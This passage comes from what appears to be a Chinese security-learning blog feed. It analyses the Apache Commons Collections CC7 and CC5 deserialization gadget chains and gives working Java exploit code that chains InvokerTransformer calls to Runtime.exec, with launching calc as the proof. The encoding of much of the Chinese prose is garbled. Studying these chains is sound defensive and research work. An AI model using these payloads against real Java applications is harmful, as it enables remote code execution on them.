class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊòØÂíå<code>AbstractMap</code>Á±ªËøûËµ∑Êù•‰ΩÜÊòØËøô‰∏™Á±ªÊòØ‰∏çÂèØ‰ª•Â∫èÂàóÂåñÁöÑÔºåÊâÄ‰ª•ËøôÈáå‰∏çÂ§™Â•ΩÂÜôËøô‰∏ÄÈÉ®ÂàÜÁöÑexpÂ∞±Áõ¥Êé•ÂæÄÂêéÂêßÔºå‰∏ã‰∏ÄÊ≠•Â∞±ÊòØÂíåÂÖ•Âè£Á±ªÁöÑ<code>reconstitutionPut</code>ÊñπÊ≥ïÁªìÂêàËµ∑Êù•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;  </span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂØπ‰º†ËøõÁöÑ Entry ÂØπË±°Êï∞ÁªÑËøõË°å‰∫ÜÂæ™ÁéØÔºåÈÄê‰∏™Ë∞ÉÁî®<code>e.key.equals(key)</code>ÔºåËøôÈáå‰º†ËøõÂéªÁöÑÂèÇÊï∞keyÂ¶ÇÊûúÊòØÊàë‰ª¨ÂèØÊéßÁöÑÔºåÈÇ£‰πà<code>AbstractMap.equals()</code>‰∏≠ÁöÑmÂ∞±ÊòØÊàë‰ª¨ÂèØÊéßÁöÑ„ÄÇÈÇ£‰πàËøôÈáåÂú®ÂÖ•Âè£Á±ª‰º†ÂÖ•ÊÅ∂ÊÑèkeyÁÑ∂ÂêéË∞ÉÁî®<code>key.equals</code>Â∞±ÂèØË°åÔºåÂÉè‰∏ãÈù¢ËøôÊ†∑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351569.png" alt="image-20230709135145421"><br>‰ΩÜÁªìÊûúÊòØÊ≤°ÂèçÂ∫îÔºåËØ¥ÊòéËøôÊ†∑‰∏çË°ådebugÂèëÁé∞Ê†πÊú¨‰∏ç‰ºöËøõÂÖ•<code>equals</code>ÊñπÊ≥ïÔºåÂéªÁúãÁúãysoÂÆòÊñπÈìæÂ≠ê<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351189.png" alt="image-20230709135138136"><br>ËøôÈáåÁî®‰∫Ü‰∏§‰∏™mapÂπ∂‰∏î‰ΩøÁî®‰∫Ü‰∏§Ê¨°putÔºå‰∏ãÈù¢Â∞±ÂàÜÊûê‰∏Ä‰∏ã‰∏∫‰ªÄ‰πàË¶ÅËøôÊ†∑ÂÅöÔºåËøôÈáåÂèØ‰ª•ËØ¶ÁªÜ‰∫ÜËß£‰∏Ä‰∏ã<code>reconstitutionPut</code>ÊñπÊ≥ïÔºå<a href="https://blog.csdn.net/qq_35733751/article/details/119862728">ÂèÇËÄÉÂçöÂÆ¢</a>ËøôÈáåÂ∞±‰∏çÈáçÂ§çÂÜô‰∫Ü</p><ul><li><strong>‰∏∫‰ªÄ‰πàË¶ÅË∞ÉÁî®‰∏§Ê¨°put</strong><br>Âõ†‰∏∫Êàë‰ª¨ÈúÄË¶ÅËøõÂÖ•Âà∞<code>reconstitutionPut()</code>ÊñπÊ≥ïÈáåÈù¢ÁöÑforÂæ™ÁéØÂéªË∞ÉÁî®<code>e.key.equal()</code>‰ΩÜÊòØÂèëÁé∞<br>Á¨¨‰∏ÄÊ¨°Ë∞ÉÁî®ÁöÑÊó∂ÂÄôÁõ¥Êé•Ë∑≥Âá∫‰∫ÜforÂæ™ÁéØÂõ†‰∏∫Ëøô‰∏™Êó∂ÂÄô<code>tab[index]</code>‰∏∫Á©∫ÔºåÁÑ∂ÂêéÂú®ÂêéÈù¢ÊâçÁªô<code>tab[index]</code>ËµãÂÄºÔºåÊâÄ‰ª•ËøôÈáåÈúÄË¶ÅË∞ÉÁî®‰∏§Ê¨°Êù•Á°Æ‰øùËøõÂÖ•forÂæ™ÁéØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091352691.png" alt="image-20230709135205523"><br>ÁÑ∂ÂêéËøôÈáåËøòÊúâ‰∏™<code>e.hash == hash</code>Âà§Êñ≠ÔºåÂú®Âà§Êñ≠ÈáçÂ§çÂÖÉÁ¥†ÁöÑÊó∂ÂÄôÊ†°È™å‰∫Ü‰∏§‰∏™ÂÖÉÁ¥†ÁöÑhashÂÄºÊòØÂê¶‰∏ÄÊ†∑Ôºå‰∏∫ÁúüÂêéÊâç‰ºöÊâßË°åÂà∞<code>e.key.equal()</code>ÔºåËÄåËøô‰∏™ÂèñÂá∫Êù•Âà§Êñ≠ÁöÑÂÖ∂ÂÆûÂ∞±ÊòØlazyMap1ÂØπË±°ÁöÑhashÂÄºÂÆÉË¶ÅÁ≠â‰∫é Áé∞Âú®ÁöÑÂØπË±°‰πüÂ∞±ÊòØ lazyMap2 ÁöÑhashÂÄºÔºåËøô‰∏™hashÂÄºÊòØÂú®lazyMapÂØπË±°‰∏≠ÁöÑ <code>key.hashCode()</code> ÂæóÂà∞ÁöÑÔºåËÄåÂú®ËøôÈáåÊàë‰ª¨putÂà∞lazyMap1ÁöÑÂÄºyyÁÑ∂ÂêéÂéªËÆ°ÁÆó <code>&quot;yy&quot;.hashCode()</code> ÔºålazyMap2 ÁöÑ‰∏∫zZÂ∞±ÂÜç<code>&quot;zZ&quot;.hashCode()</code>ËøôÊ†∑ÁªèËÆ°ÁÆó‰ªñ‰ª¨ÁöÑhashÂÄºÊòØ‰∏ÄÊ†∑ÁöÑÔºåÂΩìÁÑ∂ËøôÈáåÂèØ‰ª•Áî®ÂÖ∂ÂÆÉÂ≠óÊØçÁªÑÂêà‰∏ç‰∏ÄÂÆöÊòØËøô‰∏§‰∏™ÔºåÂèÇËÄÉ<a href="https://blog.csdn.net/qq_64201116/article/details/128401981">Ê∏ÖÈ£éÂ∏àÂÇÖÁöÑÂçöÂÆ¢</a>ÈáåÈù¢ËØ¶ÁªÜËß£Èáä‰∫ÜËøôÈáåÁöÑËÆ°ÁÆóÂéüÁêÜ<br>ÁÑ∂ÂêéËøôÈáåËøòÊúâ‰∏™ÈóÆÈ¢òÔºåÂ∞±ÊòØÂú®<code>HashTable.put()</code> ‰πãÂêéÈúÄË¶ÅÂú®map2<code>remove()</code> Êéâ yyÂõ†‰∏∫ <code>HashTable.put()</code> ‰πü‰ºöË∞ÉÁî®Âà∞ <code>equals()</code> ÊñπÊ≥ïÔºåÂΩìË∞ÉÁî®ÂÆå <code>equals()</code> ÊñπÊ≥ïÂêéÔºåLazyMap2 ÁöÑ key ‰∏≠Â∞±‰ºöÂ¢ûÂä†‰∏Ä‰∏™ yy ÈîÆÔºåÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ≤°ÈóÆÈ¢òÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091353231.png" alt="image-20230709135354102"><br>‰ΩÜÊòØÂèçÂ∫èÂàóÂåñ<code>m.size()</code>Â∞±‰ºöÂèò‰∏∫2‰ΩÜÊòØÂéüÊú¨ÁöÑsizeËøòÊòØ1<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354645.png" alt="image-20230709135419679"><br>ÁÑ∂ÂêéÂ∞±Áõ¥Êé•false‰∫Ü‰∏ç‰ºöËøõÂÖ•Âà∞getÊñπÊ≥ïÈÇ£‰πà‰πüÂ∞±‰∏ç‰ºöÂëΩ‰ª§ÊâßË°å‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨Âú®ËøõÂÖ•forÂæ™ÁéØÂêéÂ∞±ÈúÄË¶ÅÁßªÈô§yyÔºåÊúÄÂêéÈÅøÂÖçÊú¨Âú∞Â∫èÂàóÂåñ‰ºöÂºπËÆ°ÁÆóÂô®ÁöÑÂπ≤Êâ∞Âú®Â∫èÂàóÂåñÁöÑËøáÁ®ã‰øÆÊîπ‰∏∫Â∏∏Êï∞ÔºåÂõ†‰∏∫Hashtable#put ‰∏≠‰πü‰ºöË∞ÉÁî®Âà∞ AbstractMap#equals ‰ªéËÄåËß¶Âèë LazyMap#getÔºåÁÑ∂ÂêéÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÈÄöËøáÂèçÂ∞Ñ‰øÆÊîπÂõûÊù•Â∞±Ë°å<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);  </span><br><span class="line">        decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);  </span><br><span class="line">        decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">        hashtable.put(decorateMap1, <span class="number">1</span>);  </span><br><span class="line">        hashtable.put(decorateMap2, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(chainedTransformer, transformers);  </span><br><span class="line">        decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(hashtable);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354569.png" alt="image-20230709135450394"></li></ul><h2 id="ÊµÅÁ®ãÂõæ"><a href="#ÊµÅÁ®ãÂõæ" class="headerlink" title="ÊµÅÁ®ãÂõæ"></a>ÊµÅÁ®ãÂõæ</h2><p>ËøôÊù°ÈìæÂ≠êË∑üÁöÑÊØîËæÉÈöæÂèóÔºå‰∏≠ÈÄîÊàëideaË∞ÉËØïÁöÑÊó∂ÂÄôÂá∫Áé∞‰∫ÜÁéÑÂ≠¶ÈóÆÈ¢òÔºå‰∏çÁÆ°ÊÄé‰πàÊàëÊÄé‰πàÂºÑHashtableËøô‰∏™Á±ªÔºåÂºÑ‰∫ÜÂçäÂ§©Ê≤°ÂºÑÂ•Ω‰∏≠Èó¥Êúâ‰∫ãÂÑøÂéª‰∫ÜÊ≤°ÂºÑ‰∫ÜÔºåÁ≠âÊàëÁ¨¨‰∫åÂ§©Êù•Ë∞ÉÂèëÁé∞Á™ÅÁÑ∂ÂèàÂ•Ω‰∫Ü‰ΩÜÊòØÊ≠§Êó∂ÊÄùË∑ØÊ≤°Êúâ‰∏ÄÂºÄÂßãÈÇ£‰πàÊ∏ÖÊô∞‰∫ÜÔºåÊàë‰πüÊáíÂæóÂÜçÈáçÊñ∞ÂàÜÊûê‰∫Ü‰ª•ÂêéÂà∑È¢òÁöÑÊó∂ÂÄôÂÜçÂºÑ‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091355993.png" alt="image-20230709135500947"></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ5</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE5/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE5/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>commons-collectionsÁâàÊú¨Â¶Ç‰∏ãÔºåËøôÈáåÊàë‰∏ÄÁõ¥ÂèÇËÄÉÁöÑÂçöÂÆ¢Ê≤°ËØ¥Ôºå‰ΩÜÂ¶ÇÊûúÊòØ4.0ÁöÑËØùÊòØÊúâÈóÆÈ¢òÁöÑÂêéÈù¢‰ºöÊèêÂà∞ÔºåÂÖ∂ÂÆÉÁéØÂ¢ÉÊ≤°Âèò</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="ÈìæÂ≠êÂàÜÊûê"><a href="#ÈìæÂ≠êÂàÜÊûê" class="headerlink" title="ÈìæÂ≠êÂàÜÊûê"></a>ÈìæÂ≠êÂàÜÊûê</h2><p>CC5Â∞±ÊòØÊîπ‰∫ÜÂÖ•Âè£ÁÇπÁÑ∂ÂêéÂíåCC1ÁöÑLazyMapËøûÊé•Ëµ∑Êù•ÔºåÁªÑÈïøÂêéÈù¢‰∏§Êù°ÈìæÂ≠êÊ≤°ÊúâËØ¶ÁªÜËÆ≤‰∫ÜÔºåÂõ†‰∏∫Â§ßÂêåÂ∞èÂºÇÔºåËøôÈáåÁõ¥Êé•Áªô‰∫ÜÂÖ•Âè£Á±ªÔºåÂõ†‰∏∫ËøôÊù°ÈìæÂ≠êËá™Â∑±ÂéªÊâæËøòÊòØÊØîËæÉÂõ∞ÈöæÁöÑÔºå‰∏∫<code>BadAttributeValueExpException</code> ÁöÑ <code>readObject()</code>ÊñπÊ≥ïÔºåÁÑ∂ÂêéË¶ÅÂíå<code>LazyMap.get()</code>Ëøû‰∏äÔºåÈÇ£‰πàÂ∞±ÊòØÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>get()</code>ÊñπÊ≥ïËøôÈáåÂ¶ÇÊûúÂéªfind usagesÂéªÊâæÁöÑËØùÂæàÈ∫ªÁÉ¶ÔºåË∞ÉÁî®ÂÆûÂú®Â§™Â§ö‰∫ÜÂ∞±Áõ¥Êé•ÁúãÂêßÔºåÊúÄÂêéÊòØÊâæÂà∞‰∫Ü<code>TiedMapEntry</code>Á±ªÁöÑ<code>getValue()</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>LazyMap.get()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343468.png" alt="image-20230709134237186"><br>ËøôÈáåÁöÑmapÂ∞±ÊòØ<code>LazyMap</code>ÁöÑÂØπË±°ÔºåÊàë‰ª¨Âú®ÁªôTiedMapEntryÁ±ªÂÆû‰æãÂåñÁöÑÊó∂ÂÄô‰ºö‰º†<code>LazyMap</code>ÔºåËÄåËøô‰∏™Á±ªÁöÑ<code>toString()</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>getValue()</code>ÊñπÊ≥ïÔºåÊé•‰∏ãÊù•Â∞±ÊòØÊää<code>TiedMapEntry</code>Á±ªÁöÑ<code>toString()</code>ÊñπÊ≥ïÂíåÂÖ•Âè£Á±ª<code>BadAttributeValueExpException</code> ÁöÑ <code>readObject()</code>ÊñπÊ≥ïËøûËµ∑Êù•ËøôÊù°ÈìæÂ≠êÂ∞±ÂÆåÊàê‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343096.png" alt="image-20230709134339935"><br>ÂèëÁé∞readObjectÊñπÊ≥ïËøôÈáå<code>valObj</code>Ë∞ÉÁî®‰∫Ü<code>toString()</code>ÊñπÊ≥ïÔºåÊÉ≥ÂäûÊ≥ïËÆ©<code>valObj</code>Âèò‰∏∫<code>TiedMapEntry</code>Á±ªÁöÑÂØπË±°Â∞±Ë°å‰∫ÜÔºåÂÖàÁúã‰∏Ä‰∏ãÂÆÉÁöÑÂàùÂßãÂåñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();  </span><br><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>ÈÇ£‰πàÂÖ∂ÂÆû<code>valObj</code>Â∞±ÊòØ<code>val</code>ËÄå<code>val</code>Â∞±ÊòØ<code>BadAttributeValueExpException</code> Á±ª‰∏≠Áõ¥Êé•ÂÆö‰πâÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344942.png" alt="image-20230709134416810"><br>ÈÇ£‰πàÈÄöËøáÂèçÂ∞Ñ‰øÆÊîπÂ∞±Ë°å‰∫ÜÔºåÂÜçÊù•Áúã‰∏∫‰ªÄ‰πà<code>BadAttributeValueExpException</code> Á±ªÂèØ‰ª•ÂèçÂ∫èÂàóÂåñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>   &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exception</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Throwable</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br></pre></td></tr></table></figure><p>Ëá≥Ê≠§ÈìæÂ≠êÂàÜÊûêÂ∞±ÁªìÊùü‰∫Ü</p><h2 id="EXPÁºñÂÜô"><a href="#EXPÁºñÂÜô" class="headerlink" title="EXPÁºñÂÜô"></a>EXPÁºñÂÜô</h2><p>ÂêéÈù¢ÁöÑÂëΩ‰ª§ÊâßË°åCC1ÁöÑLazyMapÂèØ‰ª•Áî®ÊâÄ‰ª•Áõ¥Êé•ÊãøËøáÊù•Â∞±Ë°å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span 